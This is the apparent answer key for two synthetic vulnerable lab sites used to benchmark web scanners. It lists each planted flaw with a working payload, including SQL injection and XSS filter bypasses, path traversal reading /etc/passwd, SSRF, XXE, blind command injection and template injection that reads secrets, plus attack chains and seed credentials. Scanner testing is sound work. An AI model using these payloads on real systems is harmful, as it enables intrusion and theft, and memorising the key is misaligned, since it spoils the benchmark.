# Advanced labs D and E: ground truth

Two single-application targets for scanners that already find the textbook
flaws of Labs A and B. Each plants 14 flaws and 4 decoys. Synthetic data
throughout.

What makes a flaw here hard is where it is and what guards it, not how rare its
class is. Each item has a tier:

| Tier | Meaning |
|---|---|
| 1 | The input is one a crawler does not fuzz by default (a cookie, the JS bundle); the textbook payload works |
| 2 | A simple filter or an encoding stops the textbook payload; a known bypass passes |
| 3 | Blind, browser-only, or a chain of two flaws |

Rules that hold in both labs:

- **No weak password.** Every seeded password is 20 random characters, and the
  sign-in endpoints are decoys. The way in is a broken sign-in *process*.
- **Eleven items need no account, three need one.**
- **Quiet errors.** No stack trace and no query text reaches a response.
- **Decoys** look like a flaw and are not: a finding on one is a false positive.
- **State** lives in the container and is re-seeded at start. A scan can reset a
  password or upload a file, so restart the lab between runs.
- **Reference exploits.** `./verify.sh lab-d lab-e` runs one per item and the
  attack on every decoy (`lab-d/verify.py`, `lab-e/verify.py`). The "Proof"
  columns below say what each returns.

The machine-readable copies are `ground_truth/lab-d.yaml` and
`ground_truth/lab-e.yaml`.

## Lab D: Kestrel Courier (PHP 8.3, Apache, SQLite)

Compose profile `lab-d`, `http://<host>:8401`. A parcel carrier's public site
(tracking, depots, quotes, labels, reviews) with a staff area. Pages are
rendered on the server; a small JSON API under `/api/v1` is called by the
scripts of the quote and the password-reset pages. Source: `lab-d/kestrel/app`.

Every visitor gets three cookies on the first page: `kc_depot` (the preferred
depot), `kc_lang` (the language) and `kc_prefs` (display preferences, a
base64-encoded serialized PHP object). Three items are in them.

**Way in:** broken password recovery (D10 or D11). The staff e-mail addresses
are on `/contact`. There is no self-registration.

Seed accounts, for runs with supplied credentials:

| E-mail | Password | Role |
|---|---|---|
| `m.okafor@kestrel-courier.test` | `Vq7#nL2x!Tz9rW4pKe6s` | staff, depot 1 |
| `l.brandt@kestrel-courier.test` | `hY3$Bd8uQ1m@Zc5jRx0f` | staff, depot 2 |
| `ops.admin@kestrel-courier.test` | `G6t!wP9eNa2#Uk4vLs7q` | admin |

### Without an account

| # | Tier | Class | Where | Why it is hard | Reference exploit | Proof |
|---|---|---|---|---|---|---|
| D1 | 1 | SQL injection | cookie `kc_depot`, every page | not a form or query parameter; `/depots/prefer`, which sets the cookie, stores an integer | `0 UNION SELECT value, 1 FROM settings WHERE k='canary_d1'` in the cookie; the depot name in the page header shows the result | `KC-D01-7c3e91ab` |
| D2 | 3 | SQL injection, blind | path segment `/depots/region/{slug}` | no parameter; whitespace is dropped and `union` / `select` are removed in one pass; the page shows only a count, and a failed statement looks like an empty region | `north'and(selselectect/**/value/**/from/**/settings/**/where/**/k='canary_d2')='<guess>`: "2 depots serve this region" when the guess is right | `KC-D02-e40b5d16`, read bit by bit |
| D3 | 2 | Reflected XSS | `GET /quote?ref=` | the value lands in a single-quoted attribute, encoded with `ENT_COMPAT`: `<`, `>` and `"` are encoded, `'` is not | `' autofocus onfocus=alert(document.domain) x='` | the handler in the page |
| D4 | 2 | Stored XSS | `POST /reviews` (`body`), shown on `/reviews` | HTML is encoded; only `[text](url)` becomes a link, and `javascript:` is refused, case-sensitively | `[my site](JaVaScRiPt:alert(document.domain))` | `href="JaVaScRiPt:..."` on `/reviews` |
| D5 | 2 | Path traversal | `GET /label/download?doc=` | the value is a base64-encoded file name; a plain `../` in the parameter is not valid base64 | base64 of `../../../../etc/passwd` | `root:x:0:0` |
| D6 | 2 | Local file inclusion | cookie `kc_lang` | cookie input; `../` is removed once before `include` | `....//....//....//....//etc/passwd` | `root:x:0:0` at the top of the page |
| D7 | 2 | SSRF | `POST /api/v1/rates/sync`, JSON field `carrier.endpoint` | a nested JSON field of an endpoint named only in `/assets/quote.js`; hosts that start with `localhost`, `127.`, `10.`, `192.168.` or `169.254.` are refused | `http://2130706433:8081/internal/keys` (also `http://0:8081/...`, `http://0x7f000001:8081/...`) | `KC-D07-19fa62c8` from the loopback-only key service |
| D8 | 2 | XXE | `POST /api/v1/quote/bulk` | the page sends JSON; XML is parsed only when the `Content-Type` says XML; a body that contains `file://` is refused | `<!ENTITY x SYSTEM "/etc/passwd">` with `<to>&x;</to>` (or `php://filter/...`) | `root:x:0:0` in `quotes[0].to` |
| D9 | 3 | PHP object injection | cookie `kc_prefs` | the gadget class is not visible from outside: its source is read through D5 (`../src/TemplateCache.php`) | a forged `TemplateCache` object (`path` under `/var/www/kestrel/public/uploads/pod/`, `buffer` a PHP script, `dirty` true) is written to disk when the request ends, and the script then runs | output of the written script |
| D10 | 1 | Exposed development outbox | `/_outbox/` (named in `robots.txt`, linked nowhere) | needs `robots.txt` or content discovery, then the connection to the reset form | `POST /account/forgot` for a staff address, read the link in `/_outbox/`, set a new password | `KC-D10-3a6f9c41` in message 1; a working staff session |
| D11 | 3 | Reset token compared loosely | `POST /api/v1/account/reset/confirm` | the token is compared with `==`; JSON keeps the type, and in PHP `true == "any non-empty string"` | after `POST /account/forgot` for the address: `{"email": "...", "token": true, "password": "<12+ characters>"}` | `{"ok": true}` and a working staff session |

### With a staff session

| # | Tier | Class | Where | Why it is hard | Reference exploit | Proof |
|---|---|---|---|---|---|---|
| D12 | 2 | Upload to code execution | `POST /staff/pod/upload` (`photo`), served from `/uploads/pod/` | `.php`, `.php5` and `.phar` are refused; the web server also runs `.phtml` | upload `x.phtml` with PHP code, request `/uploads/pod/x.phtml` | output of the uploaded script |
| D13 | 2 | IDOR | `GET /staff/manifest?m=` | the reference is the MD5 of the manifest number (41 and 43 belong to depot 1; 42 and 44 to depot 2) | as depot 1 staff, `m=` MD5 of `42` | `KC-D13-5e8b20f7` |
| D14 | 2 | Privilege escalation | cookie `kc_role`, read by `/admin/settings` | the role is an unsigned base64 cookie set at sign-in (`c3RhZmY=`); `/admin/` is named only in `robots.txt` | `kc_role=YWRtaW4=` | `KC-D14-a09d4c62` |

### Decoys

| # | Where | Looks like | Why it is safe |
|---|---|---|---|
| ND1 | `GET /track?ref=` | SQL injection, XSS | bound parameter; the echo is fully encoded |
| ND2 | `POST /login` | SQL injection, weak credentials | bound parameters, `password_verify`, random 20-character passwords |
| ND3 | `GET /depots/search?q=` | SQL injection, XSS | bound `LIKE`; the echo is fully encoded |
| ND4 | `GET /go?u=` | open redirect | only the three partner addresses, compared exactly |

### Chains

- **Outbox to administrator:** `/contact` (staff addresses) → `/account/forgot`
  → `/_outbox/` (D10) or the loose token check (D11) → staff session → `kc_role`
  (D14) → carrier secrets; with the same session, D12 gives code execution.
- **File read to code execution, no account:** D5 reads the application source
  → the `TemplateCache` gadget → D9 writes a script under `/uploads/pod/`.
- **SSRF to internal keys:** D7 reaches the key service on `127.0.0.1:8081`,
  which no port publishes.

## Lab E: Stagehand (React 18 + Vite, Node 22 + Express 4)

Compose profile `lab-e`, `http://<host>:8501`. An event-ticket site: public
event list, reviews, ticket lookup, QR codes and printable tickets, and an
organizer console after sign-in. Source: `lab-e/stagehand`.

Finding the API is part of the test. The pages are a single-page application
with hash routes (`/#/events`); the sign-in, checkout, console and admin
screens are separate lazy chunks; the API prefix `/svc/v3` is read from
`/app-config.json` at start; no endpoint is linked in HTML. The build's source
maps are served (E1), which is the fair way in for a scanner that reads them.
The internal key service listens on `127.0.0.1:7001` inside the container only.

**Way in:** sign-up is by invitation, but only the React form checks the invite
code (E11). A second way: the GraphQL member list leaks working sign-in links
(E5), the owner's included.

Seed accounts, for runs with supplied credentials (`POST /svc/v3/auth/login`
with `email` and `password`, then `Authorization: Bearer <token>`):

| E-mail | Password | Role |
|---|---|---|
| `owner@stagehand.test` | `qT7#vL2m@Xw9Rz4!cHd6` | admin |
| `box.office@stagehand.test` | `Jf3$Np8^bK1sYu5&gWe0` | organizer |
| `mara.lind@buyers.test` | `zB6!rQ9@tM2xVc7#Ln4d` | member |
| `theo.katz@buyers.test` | `Hy5&dS1*kP8wEa3^Gj7u` | member |

### Without an account

| # | Tier | Class | Where | Why it is hard | Reference exploit | Proof |
|---|---|---|---|---|---|---|
| E1 | 1 | Secret in the bundle; source maps served | `/assets/Checkout-*.js`, `/assets/*.js.map` | the key is in a lazy chunk that the first page does not load | read the chunks named in the entry script | `SH-E01-7c3a91be` |
| E2 | 3 | DOM XSS | `/#/events?notice=` | the value is in the address fragment and never reaches the server; `<script>` blocks are stripped before `dangerouslySetInnerHTML`; needs a browser | `<img src=x onerror=...>` | the handler runs in the page (it can read `window.__stagehand.build`, `SH-E02-4d0f6a27`) |
| E3 | 2 | Stored XSS | `POST /svc/v3/events/:id/reviews` (`body`, markdown), shown on the event page | the sanitizer removes `<script>`, `javascript:` and lower-case `on...=` handlers | `<img src=x oNerror=alert(document.domain)>` | the handler in `GET /svc/v3/events/:id/reviews` |
| E4 | 2 | NoSQL operator injection | `GET /svc/v3/tickets/lookup?ref=` | a string is safe; bracket syntax arrives as an object and is read as a query operator | `ref[$ne]=x` (or `ref[$regex]=^TK`) returns every ticket with its buyer | `SH-E04-b81e5c02` in the note of `TK-9B7F21` |
| E5 | 3 | GraphQL: missing authorization | `POST /svc/v3/gql` (named only in the console chunk) | introspection is off; the validator's "Did you mean" hints still name the fields | `{ members { email role signInLink } }`; `POST /svc/v3/auth/magic {"token"}` with a leaked link's token is a session | `SH-E05-2f9d0c64`, the owner's token |
| E6 | 2 | Open redirect | `GET /r?to=` | the target must start with `/`, and `//` is refused | `/r?to=/\evil.test/x`: URL parsers read the backslash as a slash | `Location: /\evil.test/x` |
| E7 | 3 | SSRF | `GET /svc/v3/img?src=` | the host must be the site's own or `cdn.stagehand.test`, so a loopback or internal address is refused; redirects are followed without a second check | chain with E6: `src=http://<site>/r?to=/\127.0.0.1:7001/internal/keys` | `SH-E07-e6a4317d` |
| E8 | 2 | Path traversal | `POST /svc/v3/tickets/render`, JSON field `layout.file` | a nested field; any `..` is refused, but the path is built with `path.resolve` | `{"layout": {"file": "/etc/passwd"}}` | `SH-E08-90cb2f58` in the file |
| E9 | 2 | WebSocket without a session | `ws://<host>:8501/svc/v3/live` | not an HTTP endpoint; the console's live feed answers any client | connect and read the first message | `SH-E09-5a17d3e9`, the pickup code of `ORD-1005`, with buyer e-mails |
| E10 | 3 | Command injection, blind | `POST /svc/v3/tickets/qr`, JSON field `size` | `text` is quoted for the shell, `size` is not; whitespace, `;`, the pipe, `&`, `<`, `>` and the backtick are refused; the answer is the image or a plain error | `{"text": "x", "size": "$(sleep${IFS}5)"}` | a 5 s delay (the file `/app/private/qr-signing.key` holds `SH-E10-c2048b7f`) |
| E11 | 2 | Sign-up without an invite | `POST /svc/v3/auth/register` | the form refuses without a code (its hash is in the bundle); the API never asks for it | `{"email", "password" (12+ characters), "name"}` returns a member session | `SH-E11-3be8f6a0`, `workspace.joinCode` in `GET /svc/v3/me` |

### With a member session

| # | Tier | Class | Where | Why it is hard | Reference exploit | Proof |
|---|---|---|---|---|---|---|
| E12 | 2 | Missing function-level authorization | `GET /svc/v3/admin/payouts` (also `/admin/members`) | the admin screens are a lazy chunk shown to the admin role only; the API checks only that a session exists | request it with a member's token | `SH-E12-d47a0e15` |
| E13 | 2 | IDOR | `GET /svc/v3/orders/:ref` | the reference is base64 of `ORD-<number>`; the list `GET /svc/v3/orders` is filtered by owner | base64 of `ORD-1003` | `SH-E13-08f5b9c3`, its VAT reference |
| E14 | 2 | Server-side template injection | `POST /svc/v3/account/email/preview`, JSON field `signature` | a Nunjucks render behind sign-in, named only in the console chunk | `{{7*7}}`; `{{range.constructor("return process.env.MAIL_RELAY_TOKEN")()}}` | `49`; `SH-E14-a93c6d70` |

A new member has no orders: `POST /svc/v3/orders {"eventId": 1, "qty": 1}`
makes one, so the shape of a reference can be seen.

### Decoys

| # | Where | Looks like | Why it is safe |
|---|---|---|---|
| NE1 | `GET /svc/v3/events/search?q=` | SQL injection, NoSQL injection, XSS | the value is coerced to a string and compared in memory; the page shows it as a text node |
| NE2 | `POST /svc/v3/auth/login` | NoSQL / SQL injection, weak credentials | non-string fields are a 400; scrypt; random 20-character passwords |
| NE3 | the session token (JWT) | JWT attacks | Ed25519 signature, algorithm pinned: `alg: none` and HS256 with the public key (`/.well-known/jwks.json`) are refused |
| NE4 | every `/svc/v3` response | CORS misconfiguration | one fixed origin, never the caller's, no credentials |

### Chains

- **Share link to internal keys:** E6 + E7. Neither a direct internal address
  nor a foreign host passes the picture proxy; the site's own redirect does.
- **GraphQL to administrator:** E5 leaks the owner's sign-in link; with it every
  signed-in item is reachable as admin.
- **Sign-up to payouts:** E11 gives a member session, E12 reads the payouts.

Evidence can cross: E8 also reads `/proc/self/environ` (the proof of E14), and
code execution through E10 or E14 reads any file.

## What these labs exercise in a scanner

- Inputs outside forms and query strings: cookies, path segments, nested JSON,
  encoded values, bracket-syntax queries, WebSocket and GraphQL.
- Payload adaptation: reading a filter's behaviour and choosing the bypass.
- Blind confirmation: boolean answers (D2) and timing (E10).
- Reading client code: endpoints that exist only in a script or a lazy chunk.
- Chaining, and getting an account without guessing a password.
- Restraint: eight decoys that a pattern-matching scanner reports.
